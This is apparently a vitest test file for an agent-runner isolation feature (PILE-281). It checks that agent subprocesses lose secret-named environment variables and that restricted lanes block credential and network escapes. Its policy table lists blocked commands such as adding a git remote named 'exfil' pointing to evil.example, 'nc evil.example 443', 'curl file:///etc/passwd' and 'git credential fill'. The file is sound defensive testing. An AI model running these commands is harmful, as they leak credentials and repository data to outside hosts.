import { execFileSync } from "node:child_process";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { describe, expect, it } from "vitest";

// PILE-281: agent subprocesses get a scrubbed env (no provider tokens), and
// restricted lanes run behind PATH shims that refuse credential/remote git
// ops and off-allowlist network tools. Exercises the real core.py.

const CORE_PATH = join(import.meta.dirname, "core.py");

const HARNESS = `
import json
import subprocess
import sys
import types

core_path, shim_dir, mode, payload = sys.argv[1], sys.argv[2], sys.argv[3], json.loads(sys.argv[4])

mod = types.ModuleType("pile_runner_core")
mod.__dict__["__file__"] = core_path
with open(core_path) as f:
    exec(compile(f.read(), core_path, "exec"), mod.__dict__)
ns = mod.__dict__
ns["SHIM_DIR"] = shim_dir

if mode == "env":
    env = ns["scrubbed_env"](keep=tuple(payload.get("keep", [])), shims=payload.get("shims", True))
    out = {"env": env}
elif mode == "deny":
    out = {"results": [ns["restricted_denial"](argv) for argv in payload["argvs"]]}
elif mode == "exec":
    env = ns["scrubbed_env"]()
    results = []
    for argv in payload["argvs"]:
        r = subprocess.run(argv, env=env, capture_output=True, text=True)
        results.append({"rc": r.returncode, "stderr": r.stderr})
    out = {"results": results}
else:
    raise AssertionError("unknown mode " + mode)

print("RESULT:" + json.dumps(out), flush=True)
`;

const harnessDir = mkdtempSync(join(tmpdir(), "pile-runner-isolation-"));
const HARNESS_PATH = join(harnessDir, "harness.py");
writeFileSync(HARNESS_PATH, HARNESS);

const SECRETS = {
  GITHUB_TOKEN: "ghs_secret",
  LANE_TOKEN: "lane-secret",
  PILE_LOG_TOKEN: "log-secret",
  PILE_TOKEN_URL: "https://pile.example.dev/token",
  DEVIN_CREDENTIALS_B64: "ZGV2aW4=",
  CODEX_AUTH_JSON_B64: "Y29kZXg=",
  CURSOR_API_KEY: "cursor-key",
  OPENAI_API_KEY: "sk-test",
  AWS_SECRET_ACCESS_KEY: "aws-secret",
};

function runHarness(
  mode: "env" | "deny" | "exec",
  payload: Record<string, unknown>,
  extraEnv: Record<string, string> = {}
): Record<string, unknown> {
  const env: NodeJS.ProcessEnv = {
    ...process.env,
    ...SECRETS,
    PILE_API_KEY: "pile-read-key",
    PILE_API_URL: "https://pile.example.dev",
    GIT_AUTHOR_NAME: "Lane Bot",
    REPO: "acme/widgets",
    ...extraEnv,
  };
  delete env.PILE_LOG_URL;
  const shimDir = mkdtempSync(join(harnessDir, "shims-"));
  const out = execFileSync(
    "python3",
    [HARNESS_PATH, CORE_PATH, shimDir, mode, JSON.stringify(payload)],
    { encoding: "utf8", env, timeout: 30_000 }
  );
  const line = out
    .trim()
    .split("\n")
    .find((l) => l.startsWith("RESULT:"));
  if (!line) throw new Error(`harness emitted no RESULT line:\n${out}`);
  return JSON.parse(line.slice("RESULT:".length)) as Record<string, unknown>;
}

const RESTRICTED = { PILE_LANE_RESTRICTED: "1" };

describe("scrubbed agent env (PILE-281)", () => {
  it("drops runner-only and secret-named vars", () => {
    const { env } = runHarness("env", {}) as { env: Record<string, string> };
    for (const key of Object.keys(SECRETS)) {
      expect(env[key], key).toBeUndefined();
    }
    expect(env.PILE_API_KEY).toBe("pile-read-key");
    expect(env.GIT_AUTHOR_NAME).toBe("Lane Bot");
    expect(env.REPO).toBe("acme/widgets");
    expect(env.HOME).toBeDefined();
  });

  it("keeps vars the driver explicitly needs", () => {
    const { env } = runHarness("env", { keep: ["CURSOR_API_KEY"] }) as {
      env: Record<string, string>;
    };
    expect(env.CURSOR_API_KEY).toBe("cursor-key");
    expect(env.GITHUB_TOKEN).toBeUndefined();
  });

  it("only prepends shims in restricted mode", () => {
    const open = runHarness("env", {}) as { env: Record<string, string> };
    expect(open.env.PATH).not.toContain("shims-");
    const restricted = runHarness("env", {}, RESTRICTED) as {
      env: Record<string, string>;
    };
    expect(restricted.env.PATH.split(":")[0]).toContain("shims-");
    const installer = runHarness("env", { shims: false }, RESTRICTED) as {
      env: Record<string, string>;
    };
    expect(installer.env.PATH).not.toContain("shims-");
  });
});

describe("restricted lane command policy (PILE-281)", () => {
  const cases: Array<[string[], boolean]> = [
    [["git", "status"], true],
    [["git", "commit", "-m", "x"], true],
    [["git", "fetch", "origin", "main"], true],
    [["git", "remote", "-v"], true],
    [["git", "config", "user.name", "x"], true],
    [["git", "config", "--get", "remote.origin.url"], true],
    [["git", "push", "origin", "main"], false],
    [["git", "-C", "/repo", "push"], false],
    [["git", "remote", "set-url", "origin", "https://evil.example"], false],
    [["git", "remote", "add", "exfil", "https://evil.example"], false],
    [["git", "-c", "credential.helper=store", "fetch"], false],
    [["git", "config", "--global", "url.https://evil/.insteadOf", "x"], false],
    [["git", "credential", "fill"], false],
    [["curl", "-sSL", "https://api.github.com/repos/acme/widgets"], true],
    [["curl", "-o", "out.json", "https://registry.npmjs.org/vite"], true],
    [["curl", "-s", "https://pile.example.dev/workspaces/x"], true],
    [["curl", "-sSLo", "out.json", "https://evil.example/x"], false],
    [["curl", "evil.example"], false],
    [["curl", "-x", "proxy:8080", "https://github.com"], false],
    [["curl", "file:///etc/passwd"], false],
    [["wget", "-O", "f", "https://extra.example/x"], true],
    [["ssh", "git@github.com"], false],
    [["nc", "evil.example", "443"], false],
    [["ls", "-la"], true],
  ];

  it("allows routine work and refuses credential/network escapes", () => {
    const { results } = runHarness(
      "deny",
      { argvs: cases.map(([argv]) => argv) },
      { ...RESTRICTED, PILE_NET_ALLOWLIST: "extra.example" }
    ) as { results: Array<string | null> };
    cases.forEach(([argv, allowed], i) => {
      expect(results[i] === null, argv.join(" ")).toBe(allowed);
    });
  });

  it("shims block on PATH and pass allowed commands through", () => {
    const { results } = runHarness(
      "exec",
      {
        argvs: [
          ["git", "push", "origin", "main"],
          ["git", "--version"],
          ["curl", "https://evil.example"],
        ],
      },
      RESTRICTED
    ) as { results: Array<{ rc: number; stderr: string }> };
    expect(results[0]?.rc).toBe(126);
    expect(results[0]?.stderr).toContain("pile restricted lane");
    expect(results[1]?.rc).toBe(0);
    expect(results[2]?.rc).toBe(126);
  });
});
